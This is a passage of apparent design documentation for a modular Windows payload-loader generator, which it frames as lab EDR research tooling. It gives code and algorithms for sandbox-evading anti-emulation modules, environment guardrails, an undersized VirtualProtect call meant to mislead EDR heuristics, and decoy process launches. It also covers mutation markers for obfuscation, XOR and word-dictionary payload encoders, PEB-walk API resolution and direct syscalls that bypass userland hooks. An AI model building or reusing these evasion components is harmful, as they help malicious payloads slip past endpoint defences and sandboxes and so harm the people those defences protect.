│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 15.5 Anti-Emulation Modules

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                      ANTI-EMULATION MODULE VARIANTS                            │
│  Purpose: Delay/stress execution to defeat sandbox time limits & emulation    │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ antiemulation/none.c (12 lines)  ─── No-Op                           │    │
│  │                                                                        │    │
│  │  void antiemulation() { /* nop */ }                                    │    │
│  │                                                                        │    │
│  │  Use: Baseline builds (no sandbox evasion needed)                     │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ antiemulation/sirallocalot.c (59 lines)  ─── Memory Allocation Stress│    │
│  │                                                                        │    │
│  │  Strategy: Flood VirtualAlloc/VirtualProtect/VirtualFree calls        │    │
│  │  Purpose: Overwhelm emulator memory tracking, exhaust sandbox limits  │    │
│  │                                                                        │    │
│  │  Algorithm (5 outer iterations):                                       │    │
│  │    for round in 0..5:                                                  │    │
│  │      allocs[100] = { NULL }                                            │    │
│  │      for i in 0..100:                                                  │    │
│  │        allocs[i] = VirtualAlloc(NULL, 0x1000, COMMIT|RESERVE, p_RW)   │    │
│  │        memset(allocs[i], 'A', 0x1000)       ← Write to force commit  │    │
│  │        VirtualProtect(allocs[i], 0x1000, p_RX, &old)                  │    │
│  │      for i in 0..100:                                                  │    │
│  │        VirtualFree(allocs[i], 0, MEM_RELEASE)                         │    │
│  │                                                                        │    │
│  │  Total API calls: 5 × (100+100+100) = 1500 API calls                 │    │
│  │  Total memory touched: 5 × 100 × 4KB = 2MB                           │    │
│  │                                                                        │    │
│  │  Detection relevance: Generates massive VirtualAlloc/VProtect telemetry│   │
│  │  @MUTATE markers: 3 (alloc_count, round_count, alloc_size)            │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ antiemulation/timeraw.c (29 lines)  ─── Raw Timing Check             │    │
│  │                                                                        │    │
│  │  Strategy: Busy-wait using KUSER_SHARED_DATA instead of Sleep()       │    │
│  │  Purpose: Bypass hooked/accelerated time APIs in sandboxes            │    │
│  │                                                                        │    │
│  │  Implementation:                                                       │    │
│  │    volatile DWORD* timestamp = (DWORD*)0x7FFE0004;                    │    │
│  │    // ^ KUSER_SHARED_DATA.TickCountLow (always mapped, read-only)     │    │
│  │    DWORD start = *timestamp;                                           │    │
│  │    while (*timestamp - start < TIME_TO_WAIT) { /* spin */ }           │    │
│  │                                                                        │    │
│  │  TIME_TO_WAIT = 3000 (3 seconds in tick counts, ~46.875ms per tick)  │    │
│  │                                                                        │    │
│  │  Why KUSER_SHARED_DATA:                                                │    │
│  │    • Memory-mapped at fixed address by kernel (0x7FFE0000)            │    │
│  │    • Read-only from userspace, updated by kernel timer ISR            │    │
│  │    • Cannot be hooked or accelerated by sandbox                       │    │
│  │    • No API call visible in IAT or ETW traces                         │    │
│  │                                                                        │    │
│  │  @MUTATE markers: 2 (wait_duration, check_method)                     │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 15.6 Guardrail Modules

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        GUARDRAIL MODULE VARIANTS                               │
│  Purpose: Decide whether execution should proceed (return 0) or abort (!=0)   │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ guardrails/none.c (11 lines)  ─── Always Proceed                     │    │
│  │                                                                        │    │
│  │  int guardrail() { return 0; }                                         │    │
│  │  Use: Lab testing (no environment checks needed)                      │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ guardrails/env.c (83 lines)  ─── Environment Variable Check          │    │
│  │                                                                        │    │
│  │  Strategy: Check environment variable for expected substring          │    │
│  │                                                                        │    │
│  │  Configurable via build defines:                                       │    │
│  │    -DENV_KEY="USERNAME"      (default: "USERNAME")                    │    │
│  │    -DENV_NEEDLE="Sandbox"    (default: "Sandbox")                     │    │
│  │                                                                        │    │
│  │  Algorithm:                                                            │    │
│  │    1. GetEnvironmentVariableA(ENV_KEY, buf, 1024)                     │    │
│  │    2. Case-insensitive substring search (custom ci_strstr):           │    │
│  │       • Converts both haystack and needle to lowercase                │    │
│  │       • Uses strstr() for substring matching                          │    │
│  │    3. Return 0 if needle found (proceed), 1 if not (abort)           │    │
│  │                                                                        │    │
│  │  Lab use: Default checks USERNAME contains "Sandbox"                  │    │
│  │  → In lab VM: set USERNAME=Sandbox_Test → guardrail passes            │    │
│  │  → On analyst machine: USERNAME=analyst → guardrail blocks            │    │
│  │                                                                        │    │
│  │  @MUTATE markers: 3 (check_method, string_obfuscation,               │    │
│  │                       failure_action)                                   │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 15.7 VirtualProtect Modules

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                     VIRTUALPROTECT MODULE VARIANTS                              │
│  Purpose: Wrap VirtualProtect call with different strategies                   │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ virtualprotect/standard.c (10 lines)  ─── Direct Wrapper              │    │
│  │                                                                        │    │
│  │  BOOL MyVirtualProtect(LPVOID addr, SIZE_T sz, DWORD prot, PDWORD old)│    │
│  │  {                                                                     │    │
│  │    return VirtualProtect(addr, sz, prot, old);                         │    │
│  │  }                                                                     │    │
│  │                                                                        │    │
│  │  Transparent 1:1 wrapper (no modification to call)                    │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ virtualprotect/undersized.c (22 lines)  ─── Page-Chunked Wrapper     │    │
│  │                                                                        │    │
│  │  #define VP_SIZE 16                                                    │    │
│  │                                                                        │    │
│  │  BOOL MyVirtualProtect(LPVOID addr, SIZE_T sz, DWORD prot, PDWORD old)│    │
│  │  {                                                                     │    │
│  │    for (SIZE_T offset = 0; offset < sz; offset += 0x1000) {           │    │
│  │      VirtualProtect(addr + offset, VP_SIZE, prot, old);               │    │
│  │    }                                                                   │    │
│  │  }                                                                     │    │
│  │                                                                        │    │
│  │  Technique: Request only 16 bytes per VirtualProtect call             │    │
│  │  Effect: OS changes protection on entire 4KB page regardless          │    │
│  │  Purpose: EDR may log the small SIZE_T (16) from API args, but       │    │
│  │    the actual protected region is the full 4KB page — discrepancy     │    │
│  │    may defeat size-based heuristics                                    │    │
│  │                                                                        │    │
│  │  @MUTATE markers: 2 (chunk_size, iteration_order)                     │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 15.8 Decoy Modules

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                          DECOY MODULE VARIANTS                                 │
│  Purpose: Generate benign-looking activity to dilute behavioral signal        │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ decoy/none.c (10 lines)  ─── No Decoy                                │    │
│  │                                                                        │    │
│  │  void decoy() { /* nop */ }                                            │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ decoy/winexec.c (12 lines)  ─── Launch Notepad                       │    │
│  │                                                                        │    │
│  │  void decoy() {                                                        │    │
│  │    WinExec("notepad.exe", SW_SHOWDEFAULT);                             │    │
│  │  }                                                                     │    │
│  │                                                                        │    │
│  │  Purpose: Create benign child process to blend with normal activity   │    │
│  │  Detection relevance: Creates process creation event, may trigger     │    │
│  │    parent-child relationship analysis                                  │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 15.9 @MUTATE Marker Inventory

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                      COMPLETE @MUTATE MARKER INVENTORY                         │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  Format: // @MUTATE:name(option1|option2|...)                                  │
│  Parsed by: extract_mutation_markers() in assembler.rs                         │
│  Applied by: Mutator::apply() in mutator/mod.rs                               │
│  Stripped by: strip_mutation_markers() if mutation not applied                 │
│                                                                                 │
│  ┌────────────────────────┬──────────────────┬──────────────────────────────┐  │
│  │ Marker                 │ Source File      │ Options                       │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ timing_jitter          │ loader_template  │ none|short|medium|long       │  │
│  │                        │ alloc_rw_rx      │                              │  │
│  │                        │ change_rw_rx     │                              │  │
│  │                        │ peb_walk         │                              │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ opaque_predicate       │ loader_template  │ none|simple|nested           │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ benign_api_calls       │ loader_template  │ none|registry|file|network   │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ pre_carrier_delay      │ loader_template  │ none|sleep|busy_wait|event   │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ execution_method       │ alloc_rw_rx      │ direct|callback|fiber|       │  │
│  │                        │ change_rw_rx     │   threadpool                 │  │
│  │                        │ peb_walk         │                              │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ decode_call_method     │ alloc_rw_rx      │ direct|inline                │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ api_wrapper            │ alloc_rw_rx      │ direct|getprocaddress|hash   │  │
│  │                        │ change_rw_rx     │                              │  │
│  │                        │ peb_walk         │                              │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ alloc_flags            │ alloc_rw_rx      │ commit|reserve_commit        │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ copy_method            │ alloc_rw_rx      │ memcpy|manual_loop           │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ pre_protect_delay      │ alloc_rw_rx      │ none|short|medium            │  │
│  │                        │ change_rw_rx     │                              │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ memory_pad             │ alloc_rw_rx      │ none|nop_sled|random         │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ error_handling         │ alloc_rw_rx      │ silent|exit|retry            │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ cleanup                │ alloc_rw_rx      │ none|virtualfree|zero        │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ pre_execute_delay      │ alloc_rw_rx      │ none|short|medium            │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ post_execute_action    │ alloc_rw_rx      │ none|cleanup|exit            │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ key_upgrade            │ xor              │ xor|aes|rc4                  │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ control_flow_flattening│ xor              │ off|on                       │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ loop_restructuring     │ xor              │ standard|unrolled|reversed   │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ alloc_count            │ sirallocalot     │ (numeric)                    │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ round_count            │ sirallocalot     │ (numeric)                    │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ alloc_size             │ sirallocalot     │ (numeric)                    │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ wait_duration          │ timeraw          │ (numeric)                    │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ check_method           │ timeraw          │ (options TBD)               │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ check_method           │ env              │ (options TBD)               │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ string_obfuscation     │ env              │ (options TBD)               │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ failure_action         │ env              │ (options TBD)               │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ chunk_size             │ undersized       │ (numeric)                    │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ iteration_order        │ undersized       │ (options TBD)               │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ api_resolution_order   │ peb_walk         │ (options TBD)               │  │
│  ├────────────────────────┼──────────────────┼──────────────────────────────┤  │
│  │ hash_function          │ peb_walk         │ (options TBD)               │  │
│  └────────────────────────┴──────────────────┴──────────────────────────────┘  │
│                                                                                 │
│  Combinatorial Space:                                                          │
│    3 carriers × 2 decoders × 3 antiemulation × 2 guardrails                  │
│    × 2 virtualprotect × 2 decoy × N @MUTATE option combos                    │
│    = 144 base module combinations × hundreds of marker options                │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 15.10 Legacy Build Tooling (encoder.py, Makefile, build.sh)

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    LEGACY BUILD TOOLING (Pre-Rust)                              │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ encoder.py (127 lines)  ─── Python Payload Encoder                    │    │
│  │                                                                        │    │
│  │  CLI: python encoder.py <input.bin> <output.h> [--method xor|english] │    │
│  │                                                                        │    │
│  │  Classes:                                                              │    │
│  │    XorEncoder:                                                         │    │
│  │      • Random 2-byte key (os.urandom(2))                              │    │
│  │      • Rolling XOR: byte[i] ^= key[i % 2]                            │    │
│  │      • Generates C header with key + byte array                       │    │
│  │                                                                        │    │
│  │    EnglishEncoder:                                                     │    │
│  │      • Same 256-word dictionary as payload.rs                         │    │
│  │      • Each byte → dictionary[byte] → word                           │    │
│  │      • Generates C header with dictionary + word string               │    │
│  │                                                                        │    │
│  │  Relationship to Rust PayloadEncoder (payload.rs):                    │    │
│  │    • encoder.py is the original implementation (Python)               │    │
│  │    • payload.rs is the Rust port (used by ArtifactBuilder)            │    │
│  │    • Both generate compatible payload.h format                        │    │
│  │    • encoder.py uses random key; payload.rs uses fixed [0xAA, 0x55]  │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐    │
│  │ Makefile (31 lines) + build.sh (29 lines)  ─── Legacy Build Scripts  │    │
│  │                                                                        │    │
│  │  Module selection via -D defines:                                      │    │
│  │    make CARRIER=alloc_rw_rx DECODER=xor ANTIEMU=none ...              │    │
│  │                                                                        │    │
│  │  Steps:                                                                │    │
│  │    1. #include each module via -DCARRIER_FILE="carrier/alloc_rw_rx.c" │    │
│  │    2. Compile with clang --target=x86_64-pc-windows-msvc              │    │
│  │    3. Link with xwin libraries                                        │    │
│  │                                                                        │    │
│  │  Status: SUPERSEDED by Rust ArtifactBuilder (ModularTemplate)         │    │
│  │  Still functional for quick manual builds without full Rust toolchain │    │
│  └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### 15.11 Template ↔ Rust Integration Map

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│              TEMPLATE → RUST CODE INTEGRATION POINTS                           │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌─────────────────────────┬───────────────────────┬───────────────────────┐   │
│  │ Template Artifact       │ Rust Code             │ Integration Mechanism │   │
│  ├─────────────────────────┼───────────────────────┼───────────────────────┤   │
│  │ loader_template.c       │ assembler.rs:         │ Read as String,       │   │
│  │ (8 @MODULE markers)     │   assemble()          │ regex replace markers │   │
│  ├─────────────────────────┼───────────────────────┼───────────────────────┤   │
│  │ modules/**/*.c          │ assembler.rs:         │ read_module() reads,  │   │
│  │ (module source files)   │   read_module()       │ strips own #includes, │   │
│  │                         │                       │ caches in HashMap     │   │
│  ├─────────────────────────┼───────────────────────┼───────────────────────┤   │
│  │ definitions.h           │ assembler.rs:         │ Injected at           │   │
│  │ (type contracts)        │   @MODULE:definitions │ @MODULE:definitions   │   │
│  ├─────────────────────────┼───────────────────────┼───────────────────────┤   │
│  │ payload.h               │ payload.rs:           │ Generated by          │   │
│  │ (encoded payload data)  │   generate_c_header() │ PayloadEncoder,       │   │
│  │                         │                       │ injected at           │   │
│  │                         │                       │ @MODULE:payload       │   │
│  ├─────────────────────────┼───────────────────────┼───────────────────────┤   │
│  │ // @MUTATE markers      │ assembler.rs:         │ Parsed into           │   │
│  │ (in-module mutations)   │   extract_mutation_   │ MutationMarker struct │   │
│  │                         │   markers()           │                       │   │
│  │                         │ mutator/mod.rs:       │ Applied by            │   │
│  │                         │   Mutator::apply()    │ MutationSpec matching │   │
│  │                         │ assembler.rs:         │ Stripped by           │   │
│  │                         │   strip_mutation_     │ strip_mutation_       │   │
│  │                         │   markers()           │ markers()             │   │
│  ├─────────────────────────┼───────────────────────┼───────────────────────┤   │
│  │ ModuleSelection struct  │ builder.rs:           │ User passes module    │   │
│  │ (carrier, decoder, etc.)│   build_modular_      │ names → Assembler     │   │
│  │                         │   template()          │ reads correct .c file │   │
│  ├─────────────────────────┼───────────────────────┼───────────────────────┤   │
│  │ encoder.py              │ payload.rs:           │ Parallel impl -       │   │
│  │ (Python payload encode) │   PayloadEncoder      │ both produce same     │   │
│  │                         │                       │ payload.h format      │   │
│  ├─────────────────────────┼───────────────────────┼───────────────────────┤   │
│  │ Makefile / build.sh     │ builder.rs:           │ SUPERSEDED - legacy   │   │
│  │ (legacy build scripts)  │   ArtifactBuilder     │ manual build support  │   │
│  └─────────────────────────┴───────────────────────┴───────────────────────┘   │
│                                                                                 │
│  Data flow: ModuleSelection → Assembler → merged.c → Mutator → final.c       │
│             PayloadEncoder → payload.h ───────────────┘                        │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 16. Key Design Decisions

| Decision | Implementation | Benefit |
|----------|---------------|---------|
| **Two builder APIs** | `LowLevelBuilder` (LLVM IR) + `ArtifactBuilder` (Clang direct) | LowLevelBuilder for fine-grained IR control; ArtifactBuilder for template workflows |
| **Modular templates** | `@MODULE` markers in `loader_template.c` replaced at assembly time | Combinatorial artifact generation from independent gene modules |
| **Two-level mutation** | `@MODULE` (gene selection) → `@MUTATE` (within-gene transforms) | Separate macro and micro mutation axes |
| **Weak symbol linking** | `minimal_runtime.c` uses `__attribute__((weak))` for flush functions | Single runtime binary works with/without instrumentation |
| **Direct syscall exit** | `__runtime_exit()` parses ntdll stubs, issues raw `syscall` instruction | Bypasses all userland hooks (EDR, detours) for clean exit |
| **SanitizerCoverage** | LLVM `opt -passes=sancov-module` for BB coverage | Industry standard (AFL++/libFuzzer), accurate CFG-aware detection |
| **Binary trace protocol** | `InstRecordHeader` with magic `0x49535452`, seq counter, timestamps | Structured telemetry, thread-safe, microsecond precision |
| **Aggressive flush** | Trace buffer flushed after every event | Captures exact termination line when EDR kills process |
| **Tree-sitter AST injection** | C++ parser for both C and C++ source, handles nested blocks | Accurate statement-level trace injection without debug info |
| **Deterministic builds** | `-Wl,/Brepro`, seeded PRNG in mutator, SHA256 naming | Reproducible artifacts for differential analysis |
| **UUID temp files** | `Uuid::new_v4()` for intermediate files | Concurrent build safety (parallel baseline + instrumented) |
| **Payload encoding** | XOR (low overhead) + English (low entropy) | Two entropy profiles for differential scan-time analysis |
| **Gene-based modules** | 6 independent module categories (carrier, decoder, antiemulation, guardrail, virtualprotect, decoy) | 144 base combinations from 17 module files; each gene independently testable |
| **@MODULE + @MUTATE** | Two-tier marker system: @MODULE selects genes, @MUTATE transforms within genes | Separates macro (which modules) from micro (how modules behave) mutation axes |
| **definitions.h contract** | Single header declares all inter-module prototypes and types | Modules are independently authored; contract ensures plug-compatibility |
| **PEB walk carrier** | Manual PEB/LDR traversal + PE export table parsing | Zero IAT entries for sensitive APIs; defeats static import analysis |
| **KUSER_SHARED_DATA timing** | Direct read from 0x7FFE0004 instead of GetTickCount/Sleep | Cannot be hooked, accelerated, or logged by userland sandbox |
| **Undersized VP trick** | VirtualProtect called with 16-byte size on 4KB pages | OS protects full page; logged size mismatches actual protected region |
| **Python ↔ Rust encoder parity** | encoder.py and payload.rs both produce compatible payload.h | Legacy CLI workflow (encoder.py) and Rust pipeline (PayloadEncoder) interchangeable |